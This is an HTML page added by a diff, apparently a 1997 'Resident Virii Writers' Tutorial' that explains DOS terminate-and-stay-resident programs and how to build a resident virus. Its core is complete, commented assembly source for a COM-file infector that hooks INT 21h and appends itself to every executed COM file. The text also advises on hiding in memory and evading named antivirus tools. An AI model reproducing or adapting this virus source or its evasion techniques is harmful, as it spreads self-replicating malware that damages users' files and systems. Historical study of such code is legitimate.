@@ -1,0 +1,799 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Resident Virii Writers' Tutorial</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>RESIDENT VIRII WRITERS'
+TUTORIAL<BR>
+</FONT><FONT SIZE=+2>(C)1997, LovinGOD<BR>
+</FONT><FONT SIZE=+1>E-Mail: <A HREF="mailto:one@redline.ru">one@redline.ru<BR>
+</A>Devoted to: StealthWarrior </FONT></FONT></B></P></CENTER>
+
+<P>
+<HR WIDTH="100%"></P>
+
+<P><B>INTRODUCTION. </B></P>
+
+<P><B>WHAT IS RESIDENT PROGRAM ? </B></P>
+
+<P>Usually non-resident program is a file, loaded from disk by DOS. Termination
+of such program is the passing control back to DOS. DOS frees all memory,
+allocated for and by this program, and stays idle to execute next program.
+</P>
+
+<P>Resident program passes control to DOS at the end of its execution,
+but leaves itself in memory whole or partially. </P>
+
+<P>Such way of program termination was called TSR - Terminate-and-Stay-Resident.
+So resident programs often called by this abbreviations - TSR. </P>
+
+<P>TSR stays in memory to have some control over the processes. Usually,
+TSRs takes INTerrupt vectors to its code, so, when interrupt occures, vector
+directs execution to TSR code. </P>
+
+<P>For example, TSR can watch keypresses to steal password, INT 13h sectors
+operations to substitute info, INT 21h to watch and dispatch file operations
+and so on. </P>
+
+<P><B>TSR PROGRAM EXAMPLE. </B></P>
+
+<P>This example shows &quot;normal&quot; TSR program.<BR>
+Program stays resident and beeps when you're running programs. </P>
+
+<PRE>  ;-------------- start cut here
+    .model tiny
+    .code
+    .radix 16
+    org 100
+    start:
+    jmp install
+                           ; INT 21 handler.
+                           ; When INT 21 called, we're taking control and
+                           ; looking for 4B00 - EXEC function.
+                           ; If 4B00, then beep, and/else jump to old INT 21
+                           ; address
+    handler:
+     cmp ax,4b00           ; We need 4B00 (EXEC) function
+     jne jmp_old           ; Jump old INT 21 if not
+
+                           ; EXEC function called. Perform an actions
+
+     push ax               ; SAVE REGISTERS THAT WILL BE USED !!! AX there.
+     mov  ax,0e07          ; Display teletype char, 07 - BEEP
+     int  10               ; videoservice
+     pop  ax               ; RESTORE USED REGISTERS !!!
+
+    jmp_old:               ; All we needed is DONE. Let DOS continue.
+     db 0EA                ; Instruction code JMP FAR
+     old21 dw ?,?          ; Address that been changed to our, old INT 21
+                           ; vector value
+
+    end_tsr:               ; Label to determine end of TSR part.
+
+
+    install:               ; The beginning of program
+     mov ax,3521           ; Get INT 21 vector to ES:BX
+     int 21
+     mov old21,bx          ; Save INT 21 vector to use it later
+     mov old21+2,es
+
+     mov ax,2521           ; Change INT 21 vector to HANDLER's code
+     mov dx,offset handler ; DS:DX - new address
+     int 21
+                                ; Terminate and Stay Resident
+                                ; It means program will be terminated,
+                                ; leave in memory permanent block from
+                                ; offset 0 till DX, of current segment.
+     mov dx,offset end_tsr+1
+     int 27                  ; DOS interrupt that TSR
+
+    end start
+   ;------------- finish cut here
+
+</PRE>
+
+<P><B>TSR VIRII </B></P>
+
+<P><B>INTRODUCTION </B></P>
+
+<P>TSR virii more progressive than non-TSR.<BR>
+It can control machine work.<BR>
+It can infect files during whole worktime.<BR>
+It can hide itself in files, substituting infected parts with original.<BR>
+It can do everything ... </P>
+
+<P>Unless it's TSR virus, it doesn't mean termination of infected program
+to become TSR. Method, shown above, is usesless for virii. </P>
+
+<P>When TSR virus starts from file, its main task is to establish control
+in memory. The rest tasks, such as infection, performed in resident part.
+</P>
+
+<P>As other TSRs, virus should overtake an interrupt or splice into any
+code, that might be executed. </P>
+
+<P>Interrupt handling is a classic method to keep control. </P>
+
+<P>Boot virii controls INT 13h to keep in sight sectors operations.<BR>
+File virus controls INT 21h to control file operations. </P>
+
+<P>File infection performed when some files being named to INT 21h.<BR>
+Virus can infect file at Exec(4B), Open(3D), Close(3E), Ask/Change Attributes
+(43), time (57), FindFirst/Next (4E,4F) and so on. </P>
+
+<P>This is the classic ways to infect files, but there's no limits for
+your imagination. As much imagination as possible. </P>
+
+<P><B>STRUCTURE OF TSR VIRUS </B></P>
+
+<P>The flowchart of TSR virus: </P>
+
+<OL>
+<LI>Check is virus already in memory If yes, we don't need to install it
+again, exiting [4] </LI>
+
+<LI>Allocate memory and copy virus body, hide used memory if needed </LI>
+
+<LI>Overtake interrupts </LI>
+
+<LI>Restore original program's bytes and pass control to it (it could be
+done before step [1], but this is most critical part coz antivirii uses
+it to cure file) </LI>
+</OL>
+
+<P>Things you shoulda decide before TSR virus writing: </P>
+
+<OL>
+<LI>where to reside in memory </LI>
+
+<LI>how to make virus invisible in memory </LI>
+
+<LI>what interrupt/function to handle for productive work </LI>
+
+<LI>how to handle </LI>
+</OL>
+
+<P><B>MEMORY RESIDENCE </B></P>
+
+<P>The most of memory residence methods are already detected and prevented
+by avx. But some of them are still usable. </P>
+
+<P>To learn more about DOS MEMORY ALLOCATION, see ADDITION. </P>
+
+<P><B>ALLOCATE MEMORY BLOCK </B></P>
+
+<P>We'll use this method in our virus. Cut memory block of program, then
+allocate block and move virus there. </P>
+
+<P><B>CUT CONVENTIONAL MEMORY </B></P>
+
+<P>If block, into which your program-carrier been loaded, is last, just
+decrease size of it in MCB and decrease the same value in PSP - MemTop
+(?)where is it allocated ? </P>
+
+<P>Conventional memory is 640K, of 0A000 paragraphs. If you need 4Kb for
+your virus, cut 100h paragraphs and move your body into this 4Kb gap. </P>
+
+<P><B>UNUSED PARTS OF MEMORY. </B></P>
+
+<P>Copying your self into memory that will never be used, you don't need
+to allocate, reallocate and hide anything. Just copy your body. </P>
+
+<P><B>INTERRUPT TABLE </B></P>
+
+<P>Use second half of interrupt table. It's a bit of danger if you'll cross
+with some INTs from 80h to 0FFh. If they exists and being called, machine
+will hang, be sure. </P>
+
+<P><B>UNUSED DOS AREA. </B></P>
+
+<P>Segment 60:</P>
+
+<P>0060:0000-0060:0100 is used during system boot and stay unused and unchanged
+later. It's a good place for file virus to reside. </P>
+
+<P>Also you can try memory from 54:0 till 61:0. </P>
+
+<P><B>ANOTHER PLACES. </B></P>
+
+<P>DOS stack area, which never be used coz stack is too big. </P>
+
+<P><B>VIDEOBUFFER. </B></P>
+
+<P>Don't reside there, coz it resets at videomode change. But it can be
+used for temporary operations. </P>
+
+<P>Cut DOS file buffers (BUFFERS= in config.sys) and use the gap. </P>
+
+<P><B>ADVANCED METHODS. </B></P>
+
+<P><B>TSR AFTER PROGRAM TERMINATION. </B></P>
+
+<P>Not new, already used in Maverick and Tchechen virii family. </P>
+
+<P>Copy your body into addresses about 9000:0.<BR>
+Overtake termination handler, INT 22h, but not in interrupt table !!!<BR>
+Address for program termination located at offset 000C in PSP.<BR>
+Set it to your handler, allocated somewhere in 9XXX seg. </P>
+
+<P>When this address called, memory, used by program, already released
+!<BR>
+Allocate new block, it will be situated just after last TSR program - it's
+not suspicious. Move virus there and overtake INT 21h. </P>
+
+<P>Wait for program termination and allocate block after the TSR Small
+piece of resident code with overlay part on disk and so on... </P>
+
+<P><B>ANTIVIRUS ALERT </B></P>
+
+<P>TSR antivirus programs are main enemy of your virus. &quot;-D&quot;,&quot;AVPTSR&quot;
+and others. </P>
+
+<P><B>THEY CAN DETECT AND/OR PREVENT YOUR ATTEMPTS TO... </B></P>
+
+<P><B>ALLOCATE AND RESIDE IN MEMORY</B> </P>
+
+<P>Conventional memory decreasing. If total amount of conventional memory
+isn't 640Kb, almost all antiviruses will scream about it. So don't decrease
+total memory using method, described above. </P>
+
+<P>Free memory decreasing.<BR>
+If virus did allocate block and reserve it, amount of free memory decreased.
+It could be marked. </P>
+
+<P><B>OVERTAKE INTERRUPT </B></P>
+
+<P>INT 21h address could point to your virus in segment above 9000 or below
+0070 (Segment 60 or 1st half of int table), DrWeb will mark this. </P>
+
+<P>AVPTSR throws away all changed interrupt vectors after program termination,
+if program terminated as non-TSR. </P>
+
+<P><B>INFECT FILES </B></P>
+
+<P>Sitting on INT 21h, they control each file operation and scream if something
+suspicious was happened. </P>
+
+<P><B>IS THERE REASON TO EXIST ? </B></P>
+
+<P>TSR antivirus programs are oftenly annoying.<BR>
+Fake warnings display.<BR>
+Incomprehensive for user (like INT 21h, function 3F , AX=3F00,BX=0006...
+and so on) Imagine you are user... </P>
+
+<P>TSR antivirus programs are rarely used. </P>
+
+<P>But anyway you can defeat em, you need to fight against em. It's more
+complicated for the first time, let speak about it later. </P>
+
+<P>Now, </P>
+
+<P><B>TSR COM VIRUS SOURCE WITH DESCRIPTION </B></P>
+
+<P>Source realized as infected program. When virus is done, the original
+&quot;infected in source&quot; program displays message. </P>
+
+<P>Compiled with Turbo Assembler v.2.X and later. </P>
+
+<PRE> ------- start cut here
+
+                        ; Standard COM source beginning
+ .model tiny
+ .code
+ .radix 16
+  org 100
+
+  vir_paras equ 100     ; Paragraphs, required for virus in memory
+
+ start:
+
+        jmp virus       ; First 3 virus bytes
+        ;-------------------------------------
+        mov ah,09                               ; Infected program
+        mov dx,offset message                   ;
+        int 21                                  ;
+        int 20                                  ;
+        message db 'Virus Startoval',0dh,0a,'$' ;
+        db 100 dup(0)                           ;
+        ;-------------------------------------
+
+ virus:                                         ;
+
+   ; First we need to locate where we've been started from.
+   ; Virus can be added to COM file of any length.
+   ; So, starting offset will be different in each case
+
+   ; The below code is very suspicious coz only virii uses it
+   ; Another method is to put offset address into code when
+   ; infecting file.
+
+        call $+3                                ; Hex dump is &quot;E8 00 00&quot;
+                                                ; Call next instruction
+                                                ; It's offset will be pushed
+                                                ; into stack (for RET)
+        pop bp                                  ; getting it
+        sub bp,0003                             ; minus &quot;call $+3&quot; size
+
+   ; Return original 3 bytes at the beginning of program (CS:0100),
+   ; that been changed by virus to &quot;JMP VIRUS&quot;
+
+        mov ax,2 ptr ds:[bp][oldbytes-virus]    ; 2 bytes
+        mov ds:[100],ax                         ;
+        mov al,ds:[bp][oldbytes+2-virus]        ; 3rd byte
+        mov ds:[100+2],al                       ;
+                                                ; Now we can pass control
+                                                ; to original program code
+                                                ; when virus done
+;-----------------------------------------------------------------------
+;
+; Being put in memory once, it still in and handle INT 21.
+; To check is virus in memory or not, call pseudofunction, 0F1D0 here.
+; This function is being served by our interupt handler ( see MY21: )
+; If virus already in memory,  it will respond us with another value in AX.
+; If not, DOS will return 0F100h in AX (See addition UNEXISTING DOS FUNCTION)
+
+   mov ax,0f1d0
+   int 21
+   cmp ax,0deadh
+
+   jne cont_virus
+                                ; We've get responce ! AX=0DEADh
+                                ; Virus already in memory and controls INT 21
+                                ; jump to original program
+   mov ax,100
+   jmp ax
+
+  cont_virus:                   ; Virus isn't in memory. Correct this !
+;-------------------------------------
+; Allocating memory for the virus.
+;
+; Decrease size of current memory block, totally used by the program.
+; Program doesn't need so much memory.
+; Then allocate new memory block
+
+; As we need VIR_PARAS paragraphs, we need to free VIR_PARAS+1 to allow DOS
+; create an MCB for the new block.
+
+                                ; Getting block size from MCB
+        push ds
+        mov  bx,ds              ; PSP segment address
+        dec  bx
+        mov  ds,bx              ; MCB segment (PSP-1)
+        mov  bx,ds:[0003]       ; Memory block size
+        sub  bx,vir_paras+1
+        pop  ds
+
+        mov ah,4a               ; Change block size
+        int 21
+
+        mov ah,48               ; Allocate memory block
+        mov bx,vir_paras
+        int 21
+                                ; Result: on error CarryFlag=1
+                                ; on success CF=0, AX=Block's Segment Address
+        mov es,ax
+        xor di,di               ; Move CX bytes - DS:[SI] ===&gt; ES:[DI]
+        mov si,bp
+        mov cx,end_virus-virus
+        rep movsb
+
+; Now virus is in separate memory block and begins with offset 0
+; Jump into this block.
+
+        push es                 ; CS
+        mov  ax,continue-virus
+        push ax                 ; IP
+        retf
+
+ continue:
+
+;--------------------------------------------------------------------
+  Program has allocated memory block.
+  Block owner's address now is segment address of program.
+  When program terminates, all its memory will be deallocated, including
+  the block where virus resides now.
+  We need to leave block in memory.
+  Let system be the new owner of our block.
+  The value of owner is 0008.
+
+    mov ax,es
+    dec ax
+    mov es,ax                   ; MCB of virus mem.block
+    mov 2 ptr es:[0001],0008    ; Owner: SYSTEM
+
+                                ; INFO:  DS = Old PSP, ES = NewMCB
+;--------------------------------------------------------------------
+    push ds                     ; Save program segment addr. for later return
+
+    push cs                     ; DS=CS
+    pop  ds
+;--------------------------------------------------------------------
+; Overtaking INT 21.
+; The simpliest method is to use INT 21 functions.
+
+; First, get INT 21 vector to use it in our handler for calling INT 21 and
+; for passing execution to it.
+
+    mov ax,3521             ; Get int. vector (al=int number)
+    int 21                  ; Return:  ES:BX - INT 21 vector
+
+    mov ds:[old21-virus],bx
+    mov ds:[old21+2-virus],es
+
+; Set new interrupt vector to our handler.
+
+    mov ax,2521             ; AL=int. number
+    mov dx,my21-virus       ; DS:DX - handler's address
+    int 21
+
+; Now virus terminating and stays resident
+
+;   Makeup registers before the virus terminating
+;   CS=DS=ES=SS Set DS and ES to program's segment
+
+    pop  ds
+    push ds
+    pop  es
+
+;   Jump to original program
+
+    push ds                 ; (CS)  program segment
+    mov ax,100              ; COM starts from offset 0100
+    push ax                 ; (IP)
+    retf                    ; Jump to original program
+
+;-------------------------------------------------------------------
+;  INT 21 handler.
+;  If INT 21 was called with function 0F1d0, virus returns AX=0DEADh
+;  If function = 4B00 (Execute), handler tests file on virus presence
+;     and infects this file; then pass control to original INT 21;
+;     program will be executed (but infected before)
+;  If any other function called, handler passes control to original INT 21
+
+    my21:
+
+      cmp ax,0f1d0              ; virus' self-check function
+      je  fido_dead
+
+      cmp ax,4b00               ; Function Exec ?
+      je  func_exec             ; Go and infect
+
+      jmp jmpold21              ; Any other function ? Pass control to
+                                ; original INT 21. We ain't interested in it.
+    fido_dead:
+        mov ax,0deadh           ; Answer, that we're in memory
+        iret                    ; Exit from INT 21
+
+    func_exec:                  ;
+                                ; 4B00:(Execute file)
+                                ; Entry:  DS:DX= pathname,0 (ASCIIZ-line)
+                                ;         ES:BX= parameters block (nevermind)
+
+                                ; Save all registers
+     push ax cx dx bx bp si
+     push di ds es
+
+     mov ax,3d02             ; Open file for read/write
+                             ; DS:DX already points to filename to be exec'ed
+     call calldos            ; Calling INT 21h via original address
+     ;jc error               ; CF=1 if open error
+                             ; AX=Handle
+
+        ; INT 21 file functions, which dealth with handle, requires
+        ; handle in BX. Put it in BX and stay there
+        ; After INT 21 call BX still unchanged.
+        ; So, put it in BX once and then we don't need to do it again
+
+     ;mov bx,ax              ;
+      xchg ax,bx             ; Optimized &quot;MOV BX,AX&quot; - 1 byte against 2
+
+;-------------------------------------------------------
+  Test file on virus presence.
+  Infection ID there is 'GL' before the EOF. Read 2 bytes before EOF
+  and test it.
+
+
+        mov ax,4202             ; Set file pointer (func.42)
+                                ; AL=02 - offset from EndOfFile
+                                ; (01-from current position,00-from begin
+                                ; CX:DX - dword - required offset
+                                ; CX-high 2 bytes, DX-low two bytes
+        mov cx,-1               ;
+        mov dx,-2               ; -2 (FFFFFFFE) 2 bytes before EOF
+
+        ;bx=handle              ; Handle in BX still present
+        call calldos
+
+        mov ah,3f               ; Read from file
+        mov cx,2                ; CX=How many bytes (2bytes)
+        mov dx,tmpbuf-virus     ; DS:DX - where to put these bytes
+
+        push cs                 ; DS should point to our segment
+        pop  ds                 ;
+
+        call calldos
+
+        cmp ds:[tmpbuf-virus],'GL'   ; !!! Look at reverse record 'LG','GL'
+        jne not_infected             ; If not equal, file isn't infected
+
+
+        ; DEBUG MESSAGE displays &quot;FILE IS ALREADY INFECTED&quot;
+
+           mov ah,09                       ;
+           mov dx,infected_msg-virus       ;
+           call calldos                    ;
+           jmp close_exit                  ; Goto exit
+
+    not_infected:                       ; We needa infect it !
+
+        ;DEBUG MESSAGE: File isn't infected
+        mov ah,09                       ;
+        mov dx,notinfected_msg-virus    ;
+        call calldos                    ;
+
+
+ ; INFECT FILE
+
+    infect_file:
+                             ; Set file pointer to the beginning of file
+        mov ax,4200
+        xor cx,cx            ; 0
+        xor dx,dx            ; 0
+        call calldos         ; 0 offset from file beginning
+
+
+                             ; Read 3 bytes. It will be substituted with
+                             ; JMP VIRUS
+        mov ah,3f
+        mov dx,oldbytes-virus
+        mov cx,3
+        call calldos
+
+ ; TEST FILE TYPE - COM or EXE
+   EXE has &quot;MZ&quot; or &quot;ZM&quot; at file start
+
+        mov si,dx            ; look at read operation - DX=read buffer offset
+        cmp ds:[si],'ZM'
+        je  infect_exe
+        cmp ds:[si],'MZ'
+        je  infect_exe
+        jmp infect_com
+
+    infect_exe:                 ; EXE file infection - next time; skip now
+        jmp close_exit
+
+    infect_com:
+                                ; Evaluate file size.
+                                ; File size could be evaluated by setting
+                                ; pointer to EOF (4202, CX:DX=0)
+        mov ax,4202
+        xor cx,cx
+        xor dx,dx
+        call calldos
+                                ; Returns:  DX:AX - filesize
+                                ; DX - high word, AX - low word
+
+                                ; Test file size. File + virus shouldn't
+                                ; be over 64Kb
+        cmp ax,0f000
+        jb  suitable
+        jmp close_exit          ; File+Virus &gt; 64kb
+
+   suitable:
+
+                ; Create &quot;JMP VIRUS&quot; instruction.
+                ; Opcode of near jump is 0E9, then 2 bytes of offset
+                ; Offset is relative, it starts from next instruction
+                ; 0100: E9 0000      jmp 0103
+                ; 0103: ...
+                ; 0110: E9 0010      jmp 0123
+                ; ..
+                ; 0123:
+                ; Virus code will starts from the EOF, so jmp operand
+                ; will be (FILE_LENGTH-3)
+
+        sub ax,0003
+        mov 2 ptr ds:[jmpformed+1-virus],ax
+                                   ; jmpformed is place for &quot;JMP VIRUS&quot;
+                                   ; instruction that will be put into the
+                                   ; file start
+
+        mov ax,4200                ; set pointer to the beginning of file
+        xor cx,cx
+        xor dx,dx
+        call calldos
+
+        mov ah,40                  ; write 3 bytes
+        mov cx,3
+        mov dx,jmpformed-virus
+        call calldos
+
+        jc close_exit              ; exit on error
+
+                              ; Now it's time to add the rest virus to file
+        mov ax,4202                ; Set pointer to the EOF
+        xor cx,cx
+        xor dx,dx
+        call calldos
+
+        mov ah,40                  ; Write whole virus body
+        mov cx,end_virus-virus
+        xor dx,dx                  ; body starts at offset 0000
+        call calldos
+
+              ; Each opened file should be closed after use.
+              ; If too many files opened, the next file opening will
+              ; cause &quot;Too many files opened&quot; error.
+
+              ; *Anyway, DOS automatically closes handles 5..15 on program
+              ; termination and before program execution
+
+    close_exit:
+
+        mov ah,3e                       ;Close file, handle in BX
+        call calldos
+
+  ;-------------------------------------------------------
+
+        pop es ds di                    ; Restore all pushed registers
+        pop si bp bx dx cx ax
+
+   ; Now the state of registers is the same as was
+
+    jmpold21:                  ; We've done, let DOS does what it
+                               ; should
+
+                                ; jmp 4 ptr cs:[old21-virus]
+        db 0ea                  ; jmp far opcode
+        old21 dw ?,?            ; IP,CS - Here's old INT 21 vector
+
+        tmpbuf db ?,?           ;
+        infected_msg    db 'This file already infected.',07,0dh,0a,'$'
+        notinfected_msg db 'This file isn''t infected.',07,0dh,0a,'$'
+
+   ;----------------------------------
+    calldos proc                        ; Call real DOS (vector that
+                                        ; was before our handler)
+                                        ; INT instruction pushes Flags,CS,IP
+                                        ; IRET
+        pushf
+        call 4 ptr cs:[old21-virus]     ; call old DOS vector
+        retn
+        calldos endp
+
+        ;-------------------------------------
+        jmpformed db 0e9,00,00          ; buffer for &quot;JMP VIRUS' instruction
+        oldbytes db 90,90,90            ; original program 3 bytes are stored
+                                        ; there
+        db 'LG'                         ; VIRUS ID
+ end_virus:
+ end start
+
+
+;------------- end cut here
+</PRE>
+
+<P><B>ADDITIONS </B></P>
+
+<P><B>DOS MEMORY ALLOCATION<BR>
+DOS MEMORY LOGICAL STRUCTURE </B></P>
+
+<PRE>  Structure of Conventional (640Kb) memory:
+
+  0000:0000 - 0000:03FF   Interrupt vectors table
+  0000:0400 - 0000:0500   BIOS data area
+  0000:0500 - 0000:05..   DOS  data area
+  0000:0700 - 9FFF:0000   Memory for system and programs
+
+  Memory management in DOS performed via Memory Control Blocks (MCB).
+  All memory after DOS data areas consists of blocks.
+  Each block is paragraph aligned and has own MCB.
+
+  MCB located before the block.
+  Size of MCB is one paragraph (10h bytes).
+</PRE>
+
+<P><B>MCB CONTENTS </B></P>
+
+<PRE>  offset  size    meaning
+
+    0      1      'M' - this block is not last
+                  'Z' - this is last memory block
+
+    1      2      Segment of block owner. If program allocates memory,
+                  Owner field fills with segment address of this program.
+                  0 - free block. After program termination all blocks,
+                      allocated by it, became free by putting 0 there.
+                  8 - owned by system - it will never be freed
+
+    3      2      Block size in paragraphs
+    8      8      Name of program that owns block. Did you see the memory
+                  map which shows TSRs names ?
+
+  The 1st NCB is determined by DOS and could be found thru LIST OF LISTS.
+
+        mov ah,52h              ; Get DOS List of Lists
+        int 21h
+        mov es,es:[bx-2]        ; ES:BX - List of Lists address
+                                ; ES:[BX-2] - (2 bytes) 1st MCB segment addr.
+
+  To see memory map, you can walk thru the chain of blocks.
+  For example, 1st MCB is at 0780 segment.
+
+   0780:0 'M' 0781  0200 ....
+             owner size
+
+   2nd MCB is   0780
+               +   1 - MCB block size
+               + 200 - Block size
+               -----
+                0981
+
+   0981:0 'M' 0982 1000 ... and so on
+
+  Block size is a size without MCB, block segment is MCB_Segment+1.
+</PRE>
+
+<P><B>DOS MEMORY HANDLING FUNCTIONS </B></P>
+
+<P>INT 21h functions 48,49 and 4A are used to allocate and release memory
+blocks. </P>
+
+<P><B>ALLOCATE MEMORY </B></P>
+
+<PRE>   mov ah,48h
+   mov bx,REQUIRED_PARAGRAPHS   ; How many paragraphs to allocate
+   int 21h
+   jc  Not_Enough_Memory        ; On ERROR CF=1, AX contains amount
+                                ; of available memory in biggest free
+                                ' block
+
+   mov es,ax                    ; On SUCCESS AX=Segment Address of
+                                ; allocated block
+</PRE>
+
+<P>Remember - one paragraph will be taken for MCB. </P>
+
+<P><B>RELEASE MEMORY </B></P>
+
+<PRE>                                ; DS (?) should point to memory block
+   mov ah,49h
+   int 21h
+</PRE>
+
+<P><B>REALLOCATE MEMORY (Change block size) </B></P>
+
+<PRE>                                ; DS (?) should point to memory block
+   mov ah,4Ah
+   mov bx,NEW_SIZE_IN_PARAGRAPHS
+   int 21h
+</PRE>
+
+<P><B>LOADING EXECUTABLES IN MEMORY </B></P>
+
+<P>Loaded COM uses whole biggest free memory block, EXE file (?) requires
+memory according to header value, but usually EXE header's MaxMem = 0FFFF,
+so also whole block will be allocated. </P>
+
+<P>Thus, you can't allocate free memory from the program, except separate
+small free blocks, situated among used. </P>
+
+<P>To allocate memory block during program(virus) execution, you need to
+cut current block, owned by program, and allocate required memory. Remember
+about one paragraph for MCB. </P>
+
+<P><B>UNEXISTING DOS FUNCTION </B></P>
+
+<P>If unexisting fuction was called, DOS zeroes AL register and IRET. </P>
+
+<P>
+<HR WIDTH="100%"></P>
+
+<P>People, English isn't my first language, so please report me about misspellings
+in this text. Thanx. </P>
+
+</BODY>
+</HTML>
